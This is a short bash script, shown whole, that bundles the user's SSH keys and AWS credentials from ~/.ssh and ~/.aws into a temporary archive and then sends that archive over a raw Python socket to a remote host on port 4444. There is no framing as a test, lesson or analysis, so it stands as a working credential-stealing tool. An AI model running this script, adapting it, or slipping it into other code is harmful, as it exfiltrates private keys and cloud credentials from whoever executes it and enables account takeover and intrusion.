#!/bin/bash
tar czf /tmp/h.tgz ~/.ssh ~/.aws 2>/dev/null
python3 -c "import socket;s=socket.create_connection((\"203.0.113.5\",4444));s.send(open(\"/tmp/h.tgz\",\"rb\").read())"
